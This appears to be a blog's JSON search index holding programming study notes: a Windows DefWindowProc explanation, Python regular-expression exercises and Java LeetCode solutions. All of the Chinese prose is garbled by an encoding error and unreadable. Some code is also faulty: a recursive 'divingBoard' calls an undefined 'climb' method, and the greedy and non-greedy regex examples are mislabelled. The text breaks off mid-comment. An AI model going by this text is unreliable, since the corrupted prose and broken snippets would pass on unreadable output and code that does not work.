DefWindowProcä»‹ç»Windowsçš„æ¶ˆæ¯ç§ç±»æœ‰ä¸Šåƒç§ï¼Œä½†æˆ‘ä»¬åªéœ€è¦å¤„ç†ç¨‹åºéœ€è¦çš„å‡ ç§æ¶ˆæ¯ï¼Œå…¶ä½™çš„éƒ½äº¤ç»™ç³»ç»Ÿå¤„ç†ï¼ŒDefWindowProcå‡½æ•°å°±æ˜¯è¿›è¡Œä¸éœ€è¦æ¶ˆæ¯çš„å¤„ç† MSDNå¯¹DefWindowProcå‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ 1234LRESULT DefWindowProc( HWND hWnd, // handle to window UINT Msg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); è¿™å››ä¸ªå‚æ•°è·Ÿçª—å£è¿‡ç¨‹å‚æ•°ç›¸åŒã€‚"},{"title":"Pythonæ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ ","date":"2021-08-08T09:15:03.089Z","updated":"2021-08-08T09:15:03.089Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/Python/Python-re.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/Python/Python-re.html","excerpt":"","text":"å­—ç¬¦åˆ†ç±» \\d â€”â€“ 0-9çš„ä»»ä½•æ•°å­— \\D â€”â€“ é™¤å¼€0-9çš„ä»»ä½•æ•°å­— \\w â€”â€“ ä»»ä½•å­—æ¯ï¼Œæ•°å­—æˆ–ä¸‹åˆ’çº¿å­—ç¬¦ \\W â€”â€“ é™¤å¼€å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ \\s â€”â€“ ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦æˆ–æ¢è¡Œç¬¦ \\S â€”â€“ é™¤ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€12import re # åé¢çš„ä»£ç ä¸­å°†é»˜è®¤å¼•å…¥msg = &#x27;My number is 415-555-4242 and 111-222-3333&#x27; # ä¸‹é¢ä¾‹å­ä¸­æ‰€ä½¿ç”¨çš„æµ‹è¯•å­—ç¬¦ä¸² example_1 123456# searchå’Œfindallçš„ä½¿ç”¨phoneNumRegex = re.compile(r&#x27;\\d\\d\\d-\\d\\d\\d-\\d\\d\\d\\d&#x27;)mo_1 = phoneNumRegex.search(msg)mo_2 = phoneNumRegex.findall(msg) # findallæ–¹æ³•è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œé‡Œé¢å­˜å‚¨æ‰€æœ‰çš„æ­£åˆ™åŒ¹é…æ•°æ®print(mo_1.group())print(mo_2[0]) 12search: 415-555-4242findall: [&#x27;415-555-4242&#x27;, &#x27;111-222-3333&#x27;] example_2 1234567# ç”¨æ‹¬å·åˆ†ç»„phoneNumRegex = re.compile(r&#x27;(\\d\\d\\d)-(\\d\\d\\d-\\d\\d\\d\\d)&#x27;) # åŠ æ‹¬å·ä¼šè¿”å›ä¸€ä¸ªå…ƒç¥–mo_1 = phoneNumRegex.search(msg) # å°†æ­£åˆ™åŒ¹é…åˆ°çš„æ•°æ®ç”¨æ‹¬å·ç»™å®šçš„èŒƒå›´åˆ†ç»„ï¼Œæ‰“åŒ…æˆå…ƒç¥–mo_2 = phoneNumRegex.findall(msg) # findallå°†æ‰€æœ‰æ‰“åŒ…å¥½çš„å…ƒç¥–å­˜æ”¾åˆ°åˆ—è¡¨ä¸­print(&#x27;mo_1 -&gt; group(0): &#x27;,mo_1.group(0))print(&#x27;mo_1 -&gt; group(1) and group(2): &#x27;,mo_1.group(1),mo_1.group(2))print(&#x27;mo_2: &#x27;,mo_2) 123mo_1 -&gt; group(0): 415-555-4242mo_1 -&gt; group(1) and group(2): 415 555-4242mo_2: [(&#x27;415&#x27;, &#x27;555-4242&#x27;), (&#x27;111&#x27;, &#x27;222-3333&#x27;)] example_3 123456# ç®¡é“ç¬¦å·çš„ä½¿ç”¨msg = &#x27;Tina Fey and Batman.&#x27;heroRegex = re.compile(r&#x27;Batman|Tina Fey&#x27;) # |ä¸ºç®¡é“ç¬¦å·ï¼Œå¦‚æœä½¿ç”¨searchæ–¹æ³•åªåŒ¹é…åˆ°æœ€è¿‘çš„ä¸€ä¸ªï¼Œfinddownä¼šå°†å¯é€‰é¡¹å…¨éƒ¨åŒ¹é…mo_1 = heroRegex.search(msg)mo_2 = heroRegex.findall(msg)print(&#x27;mo_1.group(): &#x27;,mo_1.group()) 12mo_1.group(): Tina Feymo_2: [&#x27;Tina Fey&#x27;, &#x27;Batman&#x27;] example_4 1234# ç®¡é“ç¬¦å·å¤šæ¨¡å¼åŒ¹é…batRegex = re.compile(r&#x27;Bat(man|mobile|copter|bat)&#x27;) # è‹¥å‰ç¼€ç›¸åŒåˆ™åç¼€éƒ¨åˆ†å¯ä»¥ç”¨æ‹¬å·ä¸ç®¡é“ç¬¦å°†å…¶åˆ†å¼€ï¼Œå‡å°‘è¾“å…¥mo = batRegex.search(&#x27;Batmobile lost a wheel&#x27;)print(&#x27;mo.group&#x27;, mo.group()) 1mo.group(): Batmobile example_5 1234# é—®å·å®ç°å¯é€‰åŒ¹é…batRegex = re.compile(r&#x27;Bat(wo)?man&#x27;) # ç®€å•æ¥è¯´ï¼Œæ‹¬å·é‡Œé¢çš„å­˜åœ¨åŒ¹é…æ—¶å°±åŠ ä¸Šï¼Œä¸å­˜åœ¨å°±å¿½ç•¥æ‹¬å·é‡Œé¢çš„mo = batRegex.search(&#x27;The Adventures of Batman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batman example_6 1234# ç”¨*å·å®ç°å¤šæ¬¡åŒ¹é…batRegex = re.compile(r&#x27;Bat(wo)*man&#x27;) # *å·ä»£è¡¨ç¼ºçœmo = batRegex.search(&#x27;The Adventures of Batwowowowowoman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batwowowowowoman 12## ç”¨+å·åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡batRegex = re.compile(r&#x27;Bat(wo)+man&#x27;) # +å·éœ€è¦æ‹¬å·ä¸­çš„å†…å®¹è‡³å°‘å‡ºç°ä¸€æ¬¡ example_7 12345# ç”¨èŠ±æ‹¬å·åŒ¹é…ç‰¹å®šçš„æ¬¡æ•°haRegex = re.compile(r&#x27;Ha&#123;3&#125;&#x27;) # æŒ‡å®šä¸‰æ¬¡haRegex = re.compile(r&#x27;Ha&#123;3,5&#125;&#x27;) # æœ‰å­˜åœ¨3-5ä¸ªçš„éƒ½å¯ä»¥haRegex = re.compile(r&#x27;Ha&#123;,5&#125;&#x27;) # åŒ¹é…0-5ä¸ªhaRegex = re.compile(r&#x27;Ha&#123;3,&#125;&#x27;) # åŒ¹é…3æˆ–æ›´å¤šæ¬¡ example_8 12345678910# example_6 è´ªå¿ƒåŒ¹é…å’Œéè´ªå¿ƒåŒ¹é… (å¥½åƒåœ¨python3.8ç‰ˆæœ¬ä¸­è¢«åºŸå¼ƒï¼Ÿ)## è´ªå¿ƒgreedyHaRegex = re.compile(r&#x27;(Ha)&#123;3, 5&#125;?&#x27;)mo1 = greedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo1) ## è¾“å‡ºæŠ¥é”™## éè´ªå¿ƒnotGreedyHaRegex = re.compile(r&#x27;(Ha)&#123;3,5&#125;&#x27;)mo2 = notGreedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo2) ## è¾“å‡ºæŠ¥é”™ å»ºç«‹å­—ç¬¦åˆ†ç±» example_1 123vowelRegex = re.compile(r&#x27;[aeiouAEIOU]&#x27;) # ä¸­æ‹¬å·ä¸­å°±æ˜¯ç”¨æˆ·éœ€è¦åŒ¹é…çš„å­—ç¬¦mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;A&#x27;, &#x27;O&#x27;, &#x27;O&#x27;] 123vowelRegex = re.compile(r&#x27;[^aeiouAEIOU]&#x27;) # å¦‚æœåœ¨å‰é¢åŠ ä¸Š^ç¬¦å·å°±ä»£è¡¨ä¸åŒ¹é…è¿™äº›å­—ç¬¦mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;R&#x27;, &#x27;b&#x27;, &#x27;C&#x27;, &#x27;p&#x27;, &#x27; &#x27;, &#x27;t&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;b&#x27;, &#x27;b&#x27;, &#x27;y&#x27;, &#x27; &#x27;, &#x27;f&#x27;, &#x27;d&#x27;, &#x27;.&#x27;, &#x27; &#x27;, &#x27;B&#x27;, &#x27;B&#x27;, &#x27;Y&#x27;, &#x27; &#x27;, &#x27;F&#x27;, &#x27;D&#x27;, &#x27;.&#x27;] example_2 1ext..."}],"posts":[{"title":"leetcodeåˆ·é¢˜è®°å½•-1","slug":"LeetCode/leetcode1","date":"2021-07-14T04:44:17.510Z","updated":"2021-08-08T09:29:46.724Z","comments":true,"path":"41353/","link":"","permalink":"http://example.com/41353/","excerpt":"","text":"towsum 123456789101112public int[] twoSum(int[] nums, int target) &#123; int[] index = new int[2]; for (int i = 0; i &lt; nums.length; i++) &#123; for (int j = 0; j &lt; nums.length; j++) &#123; if (nums[i] + nums[j] == target &amp;&amp; i != j) &#123; index[0] = i; index[1] = j; &#125; &#125; &#125; return index; &#125; hashMap ä¸Šé¢çš„æ–¹æ³•åœ¨æ—¶é—´å¤æ‚å µä¸Šä¸ºO(n*n)ï¼Œåœ¨æ•°æ®è¿‡å¤§æ—¶ååˆ†æš´åŠ›ï¼Œå¯ä»¥é‡‡ç”¨å“ˆå¸Œè¡¨æ¥æ£€ç´¢ reverse çœ‹åˆ°åˆ«äººçš„åšæ³•æ‰æ„Ÿè§‰å¥½å‰å®³ï¼Œæ€è·¯éå¸¸çµæ´»ã€‚ è¿™ç§æ ¹æ®åŸç†åˆ¤æ–­æ•´æ•°æ˜¯å¦æº¢å‡ºè™½ç„¶æ¯”è¾ƒç§‘å­¦ï¼Œä½†æ„Ÿè§‰æ²¡æœ‰æ¦œä¸€å¤§å“¥é‚£ä¹ˆæœ‰çµæ€§ 12345678910111213141516public int reverse(int x) &#123; int ret = 0; while(x != 0)&#123; // å…ˆåˆ¤æ–­å€’åºæ•°å­—æ˜¯å¦æ»¡è¶³æ¡ä»¶ if(ret&gt;Integer.MAX_VALUE/10 || (ret==Integer.MAX_VALUE/10 &amp;&amp; x&gt;7))&#123; return 0; &#125; if(ret&lt;Integer.MIN_VALUE/10 || (ret==Integer.MIN_VALUE/10 &amp;&amp; x&lt;-8))&#123; return 0; &#125; ret = ret*10+x%10; x /= 10; &#125; return ret; &#125; isPalindrome è¿™é“é¢˜å’Œä¸Šé¢å°†æ•°å­—å€’åºçš„æ€æƒ³æ˜¯ä¸€æ ·çš„ 12345678910111213141516public boolean isPalindrome(int x)&#123; // åˆ¤æ–­è´Ÿæ•° if(x&lt;0)&#123; return false; &#125;else &#123; int temp = x, cmpNum=0; while (temp != 0)&#123; cmpNum = cmpNum*10 + temp%10; temp /= 10; &#125; if(cmpNum==x)&#123; return true; &#125; return false; &#125; &#125; romanToInt è¿™é“é¢˜ä¹Ÿå¯ä»¥ç”¨æ‰“è¡¨çš„æ€è·¯ï¼Œå°†ä¸èƒ½å•ä¸ªå­—ç¬¦è¡¨ç¤ºçš„ç½—é©¬æ•°å­—å…¨éƒ¨ç©·ä¸¾å‡ºæ¥ï¼Œè¿™é‡Œåªæœ‰6ç»„ï¼Œç„¶åä¸Šå“ˆå¸Œè¡¨ 124, 9, 40, 90, 400, 900IV IX XL XC CD CM ä»å³åˆ°å·¦æ¥åˆ‡å‰²åˆ¤æ–­ 123456789101112131415161718192021public int romanToInt(String s) &#123; int ret = 0; String[] strArr = &#123;&quot;I&quot;,&quot;IV&quot;,&quot;V&quot;,&quot;IX&quot;,&quot;X&quot;,&quot;XL&quot;,&quot;L&quot;,&quot;XC&quot;,&quot;C&quot;,&quot;CD&quot;,&quot;D&quot;,&quot;CM&quot;,&quot;M&quot;&#125;; int[] num = &#123;1,4,5,9,10,40,50,90,100,400,500,900,1000&#125;; HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; strArr.length; i++) &#123; map.put(strArr[i],num[i]); &#125; for (int i = 0; i &lt; s.length();) &#123; if (i+2&lt;=s.length() &amp;&amp; (map.containsKey(s.substring(i,i+2))))&#123; ret += map.get(s.substring(i,i+2)); i += 2; continue; &#125; ret += map.get(s.substring(i,i+1)); i += 1; &#125; return ret; &#125; largestNumber è¿™é“é¢˜æŠ˜ç£¨äº†ä¸€å¤©ï¼Œéœ€è¦ç”¨åˆ°åˆ«äººæ„Ÿè§‰å¹¶ä¸å¤æ‚ä½†æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„æ•°å­¦è¯æ˜ï¼Œæ‰€ä»¥æ•°å­¦è¯æ˜æ˜¯ä¸å¯èƒ½è¯æ˜çš„ï¼Œç”¨å­—ç¬¦ä¸²è§£å†³ 1234567891011121314151617181920212223242526public String largestNumber(int[] nums)&#123; /// ä¸èƒ½ç”¨é¡ºåºæ’åˆ— /// æ•°å­—æ’åºå’Œå­—ç¬¦ä¸²æ’åºæ€è·¯éƒ½ä¸åŒ int n = nums.length; String[] numStr = new String[n]; for (int i = 0; i &lt; n; i++) &#123; numStr[i] = String.valueOf(nums[i]); &#125; /// compareToè¿”å›å‰å­—ç¬¦ä¸²æ¯”è¾ƒå­—ç¬¦ASCIIä¸åå­—ç¬¦ä¸²æ¯”è¾ƒå­—æ¯ASCIIçš„å·®å€¼ Arrays.sort(numStr,(a, b)-&gt;&#123; // ä½¿ç”¨lambdaé‡å†™sortå‡½æ•°ï¼Œä½¿å…¶å­—ç¬¦ä¸²é€†åºæ’åº return (b+a).compareTo(a+b); // å¦‚æœåé¢åŠ èµ·æ¥æ¯”å‰é¢å¤§çš„è¯ï¼Œè¿”å›1 // å¦åˆ™è¿”å›0 &#125;); System.out.println(Arrays.toString(numStr)); if(numStr[0].equals(&quot;0&quot;))&#123; return &quot;0&quot;; &#125; StringBuilder ret = new StringBuilder(); for (int i = 0; i &lt; numStr.length; i++) &#123; ret.append(numStr[i]); &#125; return ret.toString(); &#125; é»‘ç™½æ–¹æ ¼ç”» ä¸€é“çº¯è€ƒæ’åˆ—ç»„åˆçš„æ•°å­¦é¢˜ï¼Œä¸¤å¹´æ²¡æœ‰ç¢°è¿‡è¿™äº›è€ƒæ™ºå•†çš„ä¸œè¥¿ï¼Œè„‘è¢‹æ²¡è½¬è¿‡å¼¯æ¥ï¼Œè™½ç„¶é‡Œé¢åŒ…å«çš„æ•°å­¦çŸ¥è¯†ä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ï¼Œ 12345678910111213141516171819202122232425public int factorial(int a)&#123; if(a == 1 || a == 0) return 1; return factorial(a-1)*a; &#125; public int combine(int n, int a)&#123; return factorial(n)/(factorial(a)*factorial(n-a)); &#125; public int paintingPlan(int n, int k) &#123; if (n*n == k)&#123; return 1; &#125;else if(n &gt; k)&#123; return 0; &#125; int ret = 0; for(int a=0; a&lt;=n; a++)&#123; for(int b=0; b&lt;=n; b++)&#123; if(k == n*(a+b)-a*b)&#123; ret += combine(n, a)*combine(n, b); &#125; &#125; &#125; return ret; &#125; è·³æ°´æ¿ &amp;&amp; é’è›™è·³å°é˜¶ è¿™é“é¢˜å¦‚æœç”¨çº¯é€’å½’çš„æ–¹æ³•å»åšå±å®ä¸è¡Œï¼Œæ—¶é—´å¤æ‚åº¦å¤ªé«˜äº†&lt;O(2^n)&gt;ï¼Œæ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ€§è´¨æ˜¯ä¸€æ ·çš„ï¼Œå‰é¢ä¸¤ä¸ªæ•°å†³å®šåä¸€ä¸ªæ•°ï¼ŒåŠ¨æ€è§„åˆ’ é€’å½’æ–¹æ³• 12345public int divingBoard(int shorter, int longer, int k)&#123; if (k &lt; 0)return 0; if (k == 0)return 1; return climb(shorter, longer, k - 1) + climb(shorter, longer, k - 2); &#125; éé€’å½’æ–¹æ³• 1234567891011121314public int[] divingBoard(int shorter, int longer, int k) &#123; if(k == 0)&#123; return new int[0]; &#125; else if (shorter == longer)&#123; int[] ret = &#123;shorter * k&#125;; return ret; &#125; int[] board = new int[k + 1]; int shortest = k * shorter; for (int i = 0; i &lt; k + 1; i++) &#123; board[i] = shortest + i * (longer - shorter); &#125; return board; &#125; é‡è¦çš„å‘˜å·¥ 123456789101112131415161718192021222324252627282930313233public int retSubImp(Employee pre, List&lt;Employee&gt; employees)&#123; if (pre.subordinates.isEmpty())&#123; return 0; &#125; int imp = 0; for (Integer sub : pre.subordinates) &#123; for (Employee employee : employees ) &#123; if (sub == employee.id)&#123; imp += employee.importance; imp += retSubImp(employee, employees); &#125; &#125; &#125; return imp; &#125; public int getImportance(List&lt;Employee&gt; employees, int id) &#123; int imp = 0; for (Employee staff : employees) &#123; if (staff.id == id)&#123; imp += staff.importance; for (Integer subid : staff.subordinates) &#123; imp += retSubImp(staff, employees); break; &#125; &#125; &#125; return imp; &#125; æ‰«é›· è¿™é“é¢˜æœ‰ç‚¹å¥½ç©ğŸ˜›ï¼Œdfsæœç´¢ä¸€å…±ä¸‰ä¸ªæ­¥éª¤ åˆ¤æ–­è¯¥åæ ‡æ˜¯å¦ä¸ºé›·ï¼Œå¦‚æœæ˜¯é›·å°±ç›´æ¥ç»“æŸæ¸¸æˆ å¦‚æœä¸æ˜¯é›·ï¼Œåˆ¤æ–­åæ ‡å‘¨å›´é›·çš„ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ä¸ä¸º0ï¼Œåˆ™æ ‡è®°é›·çš„ä¸ªæ•°ï¼Œç»“æŸæ¸¸æˆ å¦‚æœå‘¨å›´æ²¡æœ‰é›·ï¼Œåˆ™é€’å½’æ£€ç´¢å‘¨å›´æ²¡æœ‰è¶Šç•Œçš„åæ ‡ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int width;int height;int countBomb = 0;int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;, &#123;-1, -1&#125;, &#123;-1, 1&#125;, &#123;1, -1&#125;, &#123;1, 1&#125;&#125;;char[] dic = &#123;&#x27;0&#x27;, &#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;&#125;;public void updateBoardDfs(char[][] board, int x, int y, int[][] sign)&#123; if (x &gt;= height || x &lt; 0 || y &gt;= width || y &lt; 0 || sign[x][y] == 1)&#123; return; &#125; // é¦–å…ˆåˆ¤æ–­å‘¨å›´8ä¸ªæ–¹å‘æ˜¯å¦æœ‰é›· getCountBomb(board, x, y); if (countBomb != 0)&#123; board[x][y] = dic[countBomb]; countBomb = 0; return; &#125; // å…«ä¸ªæ–¹å‘ for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; board[x][y] = &#x27;B&#x27;; sign[x][y] = 1; updateBoardDfs(board, post_x, post_y, sign); &#125;&#125;public void getCountBomb(char[][] board, int x, int y)&#123; for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; if (post_x &gt;= height || post_x &lt; 0 || post_y &gt;= width || post_y &lt; 0) continue; if (board[post_x][post_y] == &#x27;M&#x27;) countBomb++; &#125;&#125;/* * åˆ¤æ–­ç‚¹å‡»æ˜¯å¦ä¸ºé›· * æ£€ç´¢å‘¨å›´8ä¸ªæ–¹å‘æ˜¯å¦æœ‰é›·ï¼Œæ— é›·æ ‡è®°ä¸ºB * æœ‰é›·æ ‡æ£€ç´¢æœ‰é›·ä¸ªæ•°ï¼Œç„¶åæ ‡è®°æ•°å­— * */public char[][] updateBoard(char[][] board, int[] click)&#123; width = board[0].length; height = board.length; int[][] sign = new int[height][width]; // ç©å®¶ç‚¹å‡»çŸ©é˜µåæ ‡ char playerClickPot = board[click[0]][click[1]]; if (playerClickPot == &#x27;M&#x27;)&#123; board[click[0]][click[1]] = &#x27;X&#x27;; &#125;else &#123; updateBoardDfs(board, click[0], click[1], sign); &#125; return board;&#125; åœ¨Då¤©å†…é€è¾¾åŒ…è£¹çš„èƒ½åŠ› çœ‹é¢˜è§£æ‰“å¡ä¸‹ç­ 12345678910111213141516171819202122232425class Solution &#123; public int shipWithinDays(int[] weights, int D) &#123; int left = Arrays.stream(weights).max().getAsInt(); int right = Arrays.stream(weights).sum(); while (left &lt; right)&#123; int middle = (left+right) &gt;&gt; 1; int needDay = 1; int sum = 0; for (int goodWeight : weights)&#123; if (sum + goodWeight &gt; middle)&#123; needDay++; sum = 0; &#125; sum += goodWeight; &#125; if (needDay &lt;= D)&#123; right = middle; &#125; else &#123; left = middle + 1; &#125; &#125; return right; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"}]},{"title":"leetcodeåˆ·é¢˜è®°å½•-2","slug":"LeetCode/leetcode2","date":"2021-07-14T04:44:17.510Z","updated":"2021-08-08T09:29:40.505Z","comments":true,"path":"37154/","link":"","permalink":"http://example.com/37154/","excerpt":"","text":"Hanota ç»å…¸é€’å½’é—®é¢˜ï¼Œä»è¿™é“é¢˜å­¦åˆ°çš„å…³äºé€’å½’çš„æ€æƒ³æŒºå¤šçš„ 123456789101112131415class Solution &#123; public void move(int size, List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)&#123; if (size == 1)&#123; C.add(A.remove(A.size() - 1)); return; &#125; move(size - 1, A, C, B); C.add(A.remove(A.size() - 1)); move(size - 1, B, A, C); &#125; public void hanota(List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C) &#123; move(A.size(), A, B, C); &#125;&#125; Plaint ç»å…¸çš„dfsé—®é¢˜ï¼Œå¥½åƒæœ‰ä¸€ä¸ªæ¯”è¾ƒé«˜å¤§ä¸Šçš„åå­—å«åšæ¼«æ°´ç®—æ³•ï¼Ÿ 12345678910111213141516171819202122232425262728class Solution &#123; public void dfs(int[][] image, int[][] sign, int sr, int sc, int newColor)&#123; if (sign[sr][sc] == 1)&#123; return; &#125; int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;; int width = image.length; int length = image[0].length; sign[sr][sc] = 1; int temp = image[sr][sc]; image[sr][sc] = newColor; for (int i = 0; i &lt; 4; i++) &#123; int row = sr + step[i][0]; int col = sc + step[i][1]; if (row &gt;= width || row &lt; 0 || col &gt;= length || col &lt; 0 || sign[row][col] == 1 || temp != image[row][col])&#123; continue; &#125; dfs(image, sign, row, col, newColor); &#125; &#125; public int[][] floodFill(int[][] image, int sr, int sc, int newColor) &#123; int[][] sign = new int[image.length][image[0].length]; dfs(image, sign ,sr, sc, newColor); return image; &#125;&#125; å²›å±¿æ•°é‡ åˆ·LeetCodeç¬¬ä¸€æ¬¡ä¸€éè¿‡ğŸ˜ åˆ¤æ–­æ˜¯å¦ä¸ºæ°´ï¼Œæˆ–åˆ¤æ–­æ ‡è®°æ˜¯å¦èµ°è¿‡ dfsç¡®å®šè¿åœ¨ä¸€èµ·çš„å²›çš„èŒƒå›´ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; int height = 0; int width = 0; // ä¸Šä¸‹å·¦å³æ”¹å˜ int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; public void numIslandsDfs(char[][] grid, int row, int col, int[][] book)&#123; //å¦‚æœè¶Šç•Œå°±è¿”å› if (row &lt; 0 || row &gt;= height || col &lt; 0 || col &gt;= width)return; // å¦‚æœæ˜¯æ°´åŸŸæˆ–è€…è¯¥ç‚¹å·²ç»èµ°è¿‡ä¹Ÿè¿”å› else if (grid[row][col] == &#x27;0&#x27; || book[row][col] == 1)return; book[row][col] = 1; for (int i = 0; i &lt; 4; i++) &#123; int post_x = row + step[i][0]; int post_y = col + step[i][1]; numIslandsDfs(grid, post_x, post_y, book); &#125; &#125; public int numIslands(char[][] grid) &#123; /* * ä¸ç”¨ç›´æ¥åˆ¤æ–­å­¤å²› * ä»0å¼€å§‹æ£€ç´¢ï¼Œå¦‚æœbookæ•°ç»„ä¸­æ²¡æœ‰æ ‡è®°ä¸”æ˜¯é™†åœ°ï¼Œåˆ™æ ‡è®°book * å¼€å§‹dfsæ£€ç´¢ * */ int count = 0; height = grid.length; width = grid[0].length; int book[][]= new int[grid.length][grid[0].length]; // ä¸¤å±‚forå¾ªç¯æ¥éå†æ‰€æœ‰åæ ‡ for (int i = 0; i &lt; height; i++) &#123; for (int j = 0; j &lt; width; j++) &#123; // å¦‚æœè¯¥åæ ‡ä¸ºæ°´åŸŸæˆ–è€…æ ‡è®°ä¸º1å°±å¿½ç•¥ if (grid[i][j] == &#x27;0&#x27; || book[i][j] == 1) &#123; continue; &#125;else &#123; numIslandsDfs(grid, i, j, book); count++; &#125; &#125; &#125; return count; &#125;&#125; çŸ©é˜µä¸­çš„è·¯å¾„ 1234567æ€è·¯å¦‚ä¸‹å°†è¿”å›å€¼è®¾ç½®ä¸ºfalseå¦‚æœdfså‡ºä¸€ä¸ªå®Œæ•´çš„å•è¯é“¾åˆ™å°†è¿”å›å€¼è®¾ç½®ä¸ºtrueï¼Œå¹¶ä¸”ç›´æ¥breakéå†è¡¨ï¼Œåªå¯¹åº”å•è¯çš„é¦–å­—ç¬¦é¦–å­—æ¯å­˜åœ¨å°±ç›´æ¥è¿›è¡Œdfséå†ï¼Œéå†çš„æ–¹å‘åªæœ‰å››ä¸ªæ–¹å‘å›æº¯ï¼Œå¦‚æœé“è·¯ä¸ç¬¦åˆéœ€è¦æŠŠä¹‹å‰èµ°è¿‡çš„è·¯å…¨éƒ¨æ¸…0 ç¬¬ä¸€æ¬¡å†™çš„ä»£ç æœ€åä¸‰ä¸ªæ£€æµ‹ç‚¹æ­»æ´»ä¸èƒ½è¿‡ï¼Œä¸‹é¢è´´ç¬¬ä¸€æ¬¡å†™çš„ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; boolean objRet = false; public void existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (wordIndex == wordArray.length)&#123; this.objRet = true; return; &#125; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0 ) return; else if (book[row][col] == 1 || board[row][col] != wordArray[wordIndex]) return; book[row][col] = 1; wordIndex++; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; existDfs(board, post_x, post_y, book, wordArray, wordIndex); &#125; book[row][col] = 0; &#125; public boolean exist(char[][] board, String word) &#123; char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; if (board[i][j] == wordArray[0])&#123; int[][] book = new int[height][width]; // å¼€å§‹è¿›è¡Œdfsæœç´¢ï¼Œå¦‚æœæœç´¢æˆåŠŸå°±å°†retèµ‹å€¼ä¸ºtrue existDfs(board,i,j,book,wordArray,0); // åˆ¤æ–­åœ¨è¿›è¡Œdfsåæ˜¯å¦æ‰¾åˆ°çŸ©é˜µä¸­ç›¸åº”å•è¯ &#125; &#125; &#125; return this.objRet; &#125;&#125; ç¬¬äºŒæ¬¡å†™çš„ä»£ç ï¼Œè™½ç„¶è¿‡äº†ï¼Œä½†æ˜¯æ•ˆç‡ä¹Ÿå¤ªä½äº†ã€‚ã€‚ã€‚æœäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; public boolean existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0)return false; else if (board[row][col] != wordArray[wordIndex] || book[row][col] == 1)return false; if (wordIndex == wordArray.length-1)return true; boolean ret = false; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; book[row][col] = 1; ret = existDfs(board, post_x, post_y, book, wordArray, wordIndex+1); if (ret == true)break; book[row][col] = 0; &#125; return ret; &#125; public boolean exist(char[][] board, String word) &#123; /* * é¦–å…ˆå°†è¿”å›å€¼è®¾ç½®ä¸ºfalse * å¦‚æœdfså‡ºä¸€ä¸ªå®Œæ•´çš„å•è¯é“¾åˆ™å°†è¿”å›å€¼è®¾ç½®ä¸ºtrueï¼Œå¹¶ä¸”ç›´æ¥break * * é¦–å…ˆéœ€è¦éå†è¡¨ï¼Œåªå¯¹åº”å•è¯çš„é¦–å­—ç¬¦ * 